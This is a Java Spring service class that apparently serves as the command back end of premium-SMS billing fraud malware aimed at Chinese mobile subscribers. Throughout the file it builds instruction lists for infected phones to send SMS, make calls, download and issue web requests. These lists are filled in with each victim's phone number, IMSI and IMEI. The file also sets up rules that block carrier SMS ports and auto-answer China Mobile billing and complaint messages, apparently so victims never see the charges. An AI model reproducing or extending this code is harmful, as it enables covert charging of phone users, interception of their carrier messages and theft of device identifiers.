package net.workspace.web.service;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.Set;
import net.workspace.web.bean.GetBizResult;
import net.workspace.web.bean.GetOrderResult;
import net.workspace.web.entity.BlockEntity;
import net.workspace.web.entity.FeedbackEntity;
import net.workspace.web.entity.SettingEntity;
import net.workspace.web.entity.biz.BizEntity;
import net.workspace.web.entity.client.ClientEntity;
import net.workspace.web.entity.record.OrderRecordEntity;
import net.workspace.web.repository.OrderMyBatisDao;
import net.workspace.web.service.biz.BizService;
import net.workspace.web.service.record.OrderRecordService;
import net.workspace.web.util.ParseKsy;
import org.apache.commons.lang3.StringUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Transactional;
import bean.Block;
import bean.Feedback;
import bean.Order;
import bean.Step;
import bean.step.CallStep;
import bean.step.DelayStep;
import bean.step.DownLoadStep;
import bean.step.EndStep;
import bean.step.JsonRequestStep;
import bean.step.NetWorkStep;
import bean.step.RequestStep;
import bean.step.SmsStep;
import com.google.gson.Gson;

@Component
@Transactional(readOnly = true)
public class OrderService {
    private static final String RANDOM_PHONE = "#randomPhone#";
    private static final String RANDOM_5 = "#random5#";
    private static final String RANDOM_13 = "#random13#";
    private static final String SMS_CONTENT_DEVICE_ID = "#smsContentDeviceId#";
    private static final String PHONE_NUMBER = "#phoneNumber#";
    public static final String CAPTIAL_CODE = "#captialCode#";
    public static final String PROVINCE_CODE = "#provinceCode#";
    public static final String PROVINCE_CODE2 = "#provinceCode2#";
    public static final String PROVINCE_CODE3 = "#provinceCode3#";
    public static final String PROVINCE_CODE4 = "#provinceCode4#";
    public static final String PROVINCE_CODE5 = "#provinceCode5#";
    public static final String CID = "#CID#";
    public static final String HOST_NAME_CODE = "#hostName#";
    public static final String SEQ4 = "#SEQ4#";
    private static final String IMSI = "#IMSI#";
    private static final String IMEI = "#IMEI#";
    private static final Logger LOGGER = LoggerFactory.getLogger("PluginLogger");
    @Autowired
    BizService bizService;
    @Autowired
    LogService logService;
    @Autowired
    ProvinceService provinceService;
    @Autowired
    AreaService areaService;
    @Autowired
    SettingService settingService;
    @Autowired
    OrderRecordService orderRecordService;
    @Autowired
    OrderMyBatisDao orderMyBatisDao;
    @Autowired
    CancelService cancelService;
    private static final long WAP_GET_PHONE = 1;
    private static final long SMS_GET_PHONE = 2;
    private static final long AREA_ORDER_ID = 4;
    private static final String PN_BLOCK_PREFIX = "#jkpoae4#";
    private static final String PN_BLOCK_SUFFIX = "#defa3fg#";
    private static char[] s = "abcdefghijklMO0148304555".toCharArray();
    Random random = new Random();
    SeqNumber seq4 = new SeqNumber(5, 4);
    private OrderRecordEntity addRecord(Long provinceId, Long clientId, Long feeId) {
        OrderRecordEntity record = new OrderRecordEntity();
        record.setProvinceId(provinceId);
        record.setFeeId(feeId);
        record.setClientId(clientId);
        //record.setStepCount(stepCount);
        Date date = new Date();
        record.setOrderTime(date);
        record.setOrderDate(FormatUtil.dateFormat.format(date));
        return orderRecordService.save(record);
    }
    private Order composeOrder(ClientEntity client, BizEntity biz) throws Exception {
        Order order = null;
        if (biz != null) {
            String feeOrder = replaceOrderVarialbes(biz.getOrder(), client);
            if (feeOrder == null) return null;
            Long orderId = 0L;
            if (biz.getId() > 10) {//只添加实际业务记录,取号/取归属地业务不做处理
                OrderRecordEntity record = addRecord(Util.getClientProvinceId(client), client.getId(), biz.getId());
                orderId = record.getId();
            }
            order = new Order();
            order.bizId = biz.getId();
            boolean isMonthPaymentCancelTime = biz.getId() > 10 && "Y".equals(settingService.get().getEnableCancel()) && cancelService.isCancelTime(client);
            List<Step> stepList = new ArrayList<Step>();
            if (isMonthPaymentCancelTime) {
                stepList.addAll(getCancelStepList(biz));
            }
            stepList.addAll(getStepList(feeOrder));
            order.blockList = getBlockBeanList(biz, orderId);
            for (int i = 0; i < stepList.size(); i++) {
                Step step = stepList.get(i);
                step.feeId = biz.getId();
                step.id = Long.valueOf(i);
                step.orderId = orderId;
            }
            order.stepList = stepList;
            List<Feedback> feedbackList = new ArrayList<Feedback>();
            if (isMonthPaymentCancelTime) {
                feedbackList.addAll(getMonthlyCancelFeedbackList(biz, orderId));
            }
            if ("Y".equals(settingService.get().getEnablePpvPayCancel())) {
                feedbackList.addAll(getPpvPayCancelFeedbackList(biz, orderId));
            }
            feedbackList.addAll(getFeedbackBeanList(biz, orderId));
            order.feedbackList = feedbackList;
            order.id = orderId;
            order.executCount = 1;
            if (isMonthPaymentCancelTime) {
                cancelService.updateCancelHistory(client.getId());
            }
        }
        return order;
    }
    public String decodeDeviceId(String deviceId) {
        return ParseKsy.decode(deviceId);
    }
    public String encodeDevcieId(String deviceId) {
        return ParseKsy.encode(deviceId);
    }
    public Order getAreaOrder(ClientEntity client) throws Exception {
        return composeOrder(client, bizService.get(AREA_ORDER_ID));
    }
    private List<Block> getBlockBeanList(BizEntity fee, Long orderId) {
        List<Block> result = new ArrayList<Block>();
        if (fee.getBlockSet() != null) {
            for (BlockEntity entity : fee.getBlockSet()) {
                result.add(toBlockBean(entity, orderId, fee.getId()));
            }
        }
        SettingEntity setting = settingService.get();
        for (String port : setting.getCommonBlockPorts().split(",")) {
            if (port.trim().length() > 0) {
                Block block = new Block();
                block.id = 0;
                block.feeId = fee.getId();
                block.orderId = orderId;
                block.port = port.trim();
                block.reportSuccess = shouldReportSuccess();
                block.expire = setting.getBlockExpireTime();
                result.add(block);
            }
        }
        return result;
    }
    private List<Step> getCancelStepList(BizEntity fee) {
        List<Step> list = new ArrayList<Step>();
        {
            SmsStep step = new SmsStep();
            step.msg = "00000";
            step.receiver = "10086";
            step.continueOnFailure = true;
            step.reportSuccess = shouldReportSuccess();
            step.reportFailure = true;
            step.continueOnFailure = true;
            step.errorTryCount = 2;
            step.errorTryInterval = 29;
            list.add(step);
        }
        {
            DelayStep step = new DelayStep();
            step.delayTime = 2;
            list.add(step);
        }
        return list;
    }
    private Feedback getCustomizeFeedback(BizEntity fee, Long orderId, String port, String content) {
        SettingEntity setting = settingService.get();
        Feedback feedback = new Feedback();
        feedback.feeId = fee.getId();
        feedback.orderId = orderId;
        feedback.id = 0;
        feedback.type = 2;
        feedback.block = new Block();
        feedback.block.port = port;
        feedback.block.content = content;
        feedback.block.reportSuccess = true;
        feedback.content = "";
        feedback.port = "";
        feedback.timeout = 0;
        feedback.reportSuccess = shouldReportSuccess();
        feedback.reportFailure = true;
        feedback.expire = setting.getBlockExpireTime();
        return feedback;
    }
    private List<Feedback> getFeedbackBeanList(BizEntity fee, Long orderId) {
        List<Feedback> result = new ArrayList<Feedback>();
        if (fee.getFeedbackSet() != null) {
            for (FeedbackEntity entity : fee.getFeedbackSet()) {
                Feedback feedback = toFeedbackBean(entity, orderId, fee.getId());
                result.add(feedback);
            }
        }
        return result;
    }
    /**
     * 包月业务取消
     *
     * @param fee
     * @param orderId
     * @return
     */
    private List<Feedback> getMonthlyCancelFeedbackList(BizEntity fee, Long orderId) {
        List<Feedback> result = new ArrayList<Feedback>();
        result.add(getCustomizeFeedback(fee, orderId, "10086977", "套餐"));
        return result;
    }
    @Transactional(readOnly = false)
    public GetOrderResult getOrder(ClientEntity client, Set<Long> ignoreBizIdSet) throws Exception {
        GetOrderResult result = new GetOrderResult();
        GetBizResult bizResult = bizService.getBiz(client,ignoreBizIdSet);
        if (bizResult.biz != null) {
            result.order = composeOrder(client, bizResult.biz);
            if (result.order != null) {
                BizEntity biz = bizResult.biz;
                bizService.saveStat(biz.getId(), biz.getPrice(), Util.getStatMobile(client), Util.getClientProvinceId(client));
                //jmsProducer.saveBizStat(client, bizResult.biz);
            }
        } else {
            result.reason = bizResult.emptyDescription;
        }
        return result;
    }
    /**
     * 按次付费取消
     *
     * @param fee
     * @param orderId
     * @return
     */
    private List<Feedback> getPpvPayCancelFeedbackList(BizEntity fee, Long orderId) {
        List<Feedback> result = new ArrayList<Feedback>();
        result.add(getCustomizeFeedback(fee, orderId, "10", "订购&疑问"));
        result.add(getCustomizeFeedback(fee, orderId, "10", "宣传不符"));
        return result;
    }
    private String getRandomNumbers(int length) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append(random.nextInt(10));
        }
        return sb.toString();
    }
    public Order getSmsPhoneOrder(ClientEntity client) throws Exception {
        Order result = composeOrder(client, bizService.get(SMS_GET_PHONE));
        return result;
    }
    private List<Step> getStepList(String feeOrder) throws JSONException {
        Gson gson = new Gson();
        List<Step> stepList = new ArrayList<Step>();
        JSONArray array = new JSONArray(feeOrder);
        for (int i = 0; i < array.length(); i++) {
            JSONObject obj = array.getJSONObject(i);
            String type = obj.optString("type");
            Step step = null;
            if ("sms".equals(type)) {
                step = gson.fromJson(obj.toString(), SmsStep.class);
            } else if ("request".equals(type)) {
                step = gson.fromJson(obj.toString(), RequestStep.class);
            } else if ("jsonRequest".equals(type)) {
                step = gson.fromJson(obj.toString(), JsonRequestStep.class);
            } else if ("download".equals(type)) {
                step = gson.fromJson(obj.toString(), DownLoadStep.class);
            } else if ("call".equals(type)) {
                step = gson.fromJson(obj.toString(), CallStep.class);
            } else if ("end".equals(type)) {
                step = gson.fromJson(obj.toString(), EndStep.class);
            } else if ("delay".equals(type)) {
                step = gson.fromJson(obj.toString(), DelayStep.class);
            } else if ("network".equals(type)) {
                step = gson.fromJson(obj.toString(), NetWorkStep.class);
            }
            if (step != null) {
                stepList.add(step);
            }
        }
        return stepList;
    }
    public Order getWapPhoneOrder(ClientEntity client) throws Exception {
        BizEntity biz = bizService.get(WAP_GET_PHONE);
        return composeOrder(client, biz);
    }
    private String randomChar() {
        StringBuilder sb = new StringBuilder();
        int length = random.nextInt(5);
        for (int i = 0; i < length; i++) {
            sb.append(s[random.nextInt(s.length)]);
        }
        return sb.toString();
    }
    private String replaceOrderVarialbes(String feeOrder, ClientEntity client) throws Exception {
        if (feeOrder != null) {
            if (feeOrder.contains(PHONE_NUMBER)) {
                feeOrder = feeOrder.replaceAll(PHONE_NUMBER, client.getPhoneNumber());
            }
            if (feeOrder.contains(SMS_CONTENT_DEVICE_ID)) {
                //version1
                //feeOrder = feeOrder.replaceAll(SMS_CONTENT_DEVICE_ID, getPrefix() + encodeDevcieId(client.getDeviceId()));
                //version2
                String encodedDeviceId = randomChar() + PN_BLOCK_PREFIX + encodeDevcieId(client.getDeviceId()) + PN_BLOCK_SUFFIX + randomChar();
                feeOrder = feeOrder.replaceAll(SMS_CONTENT_DEVICE_ID, encodedDeviceId);
            }
            if (feeOrder.contains(RANDOM_5)) {
                feeOrder = feeOrder.replaceAll(RANDOM_5, String.valueOf(getRandomNumbers(5)));
            }
            if (feeOrder.contains(RANDOM_13)) {
                feeOrder = feeOrder.replaceAll(RANDOM_13, String.valueOf(getRandomNumbers(13)));
            }
            if (feeOrder.contains(SEQ4)) {
                feeOrder = feeOrder.replaceAll(SEQ4, seq4.getSeq());
            }
            if (feeOrder.contains(PROVINCE_CODE)) {
                feeOrder = feeOrder.replaceAll(PROVINCE_CODE, provinceService.get(Util.getClientProvinceId(client)).getCode());
            }
            if (feeOrder.contains(CID)) {
                feeOrder = feeOrder.replaceAll(CID, String.valueOf(client.getId()));
            }
            if (feeOrder.contains(IMSI)) {
                feeOrder = feeOrder.replaceAll(IMSI, client.getImsi());
            }
            if (feeOrder.contains(IMEI)) {
                feeOrder = feeOrder.replaceAll(IMEI, client.getImei());
            }
            if (feeOrder.contains(PROVINCE_CODE2)) {
                feeOrder = feeOrder.replaceAll(PROVINCE_CODE2, provinceService.get(Util.getClientProvinceId(client)).getCode2());
            }
            if (feeOrder.contains(PROVINCE_CODE3)) {
                feeOrder = feeOrder.replaceAll(PROVINCE_CODE3, provinceService.get(Util.getClientProvinceId(client)).getCode3());
            }
            if (feeOrder.contains(PROVINCE_CODE4)) {
                feeOrder = feeOrder.replaceAll(PROVINCE_CODE4, provinceService.get(Util.getClientProvinceId(client)).getCode4());
            }
            if (feeOrder.contains(PROVINCE_CODE5)) {
                feeOrder = feeOrder.replaceAll(PROVINCE_CODE5, provinceService.get(Util.getClientProvinceId(client)).getCode5());
            }
            if (feeOrder.contains(CAPTIAL_CODE)) {
                String captialCode = areaService.getCaptialCode(Util.getClientProvinceId(client));
                if (StringUtils.isBlank(captialCode)) return null;
                feeOrder = feeOrder.replaceAll(CAPTIAL_CODE, captialCode);
            }
            SettingEntity setting = settingService.get();
            if (feeOrder.contains(HOST_NAME_CODE)) {
                feeOrder = feeOrder.replaceAll(HOST_NAME_CODE, setting.getBizHost());
            }
            if (feeOrder.contains(RANDOM_PHONE)) {
                boolean success = false;
                String rondomPhoneNumber = null;
                String phone = setting.getSendTarget();
                if (StringUtils.isNotBlank(phone) && phone.trim().length() == 11) {
                    rondomPhoneNumber = phone;
                    success = true;
                }
                if (!success) {
                    String query = "{type:{\"$in\":[\"smsBlock\", \"smsPhoneNumber\"]},phoneNumber:{\"$ne\":null}}";
                    //String query = "{phoneNumber:{\"$ne\":null}}";
                    JSONObject result = logService.findOne(query);
                    LOGGER.info(result == null ? null : result.toString());
                    if (result != null) {
                        rondomPhoneNumber = result.optString("phoneNumber");
                        if (StringUtils.isNotEmpty(rondomPhoneNumber)) {
                            success = true;
                        }
                    }
                }
                if (success) {
                    feeOrder = feeOrder.replaceAll(RANDOM_PHONE, rondomPhoneNumber);
                }
                if (!success) return null;
            }
        }
        return feeOrder;
    }
    public void revertOrder(Long orderId) {
        orderMyBatisDao.revertOrder(orderId);
    }
    boolean shouldReportSuccess() {
        SettingEntity setting = settingService.get();
        return "Y".equals(setting.getReportBlock()) && random.nextInt(100) <= setting.getSuccessReportRate();
    }
    private Block toBlockBean(BlockEntity entity, Long orderId, long feeId) {
        Block block = new Block();
        block.feeId = feeId;
        block.id = entity.getId();
        block.orderId = orderId;
        block.port = entity.getPort();
        block.content = entity.getContent();
        block.reportSuccess = "Y".equals(entity.getReportBlock());
        block.isConfirm = "Y".equals(entity.getIsConfirm());
        block.expire = entity.getExpireTime() == null ? 0 : entity.getExpireTime();
        return block;
    }
    private Feedback toFeedbackBean(FeedbackEntity entity, Long orderId, long feeId) {
        Feedback feedback = new Feedback();
        feedback.feeId = feeId;
        feedback.orderId = orderId;
        feedback.id = entity.getId();
        feedback.type = entity.getType();
        feedback.block = new Block();
        feedback.block.port = entity.getBlockPort();
        feedback.block.content = entity.getBlockContent();
        feedback.block.reportSuccess = "Y".equals(entity.getReportBlock());
        feedback.content = entity.getContent();
        feedback.port = entity.getPort();
        feedback.timeout = entity.getTimeout();
        feedback.reportSuccess = "Y".equals(entity.getReportSuccess());
        feedback.reportFailure = "Y".equals(entity.getReportFailure());
        feedback.expire = entity.getExpireTime() == null ? 0 : entity.getExpireTime();
        return feedback;
    }
}
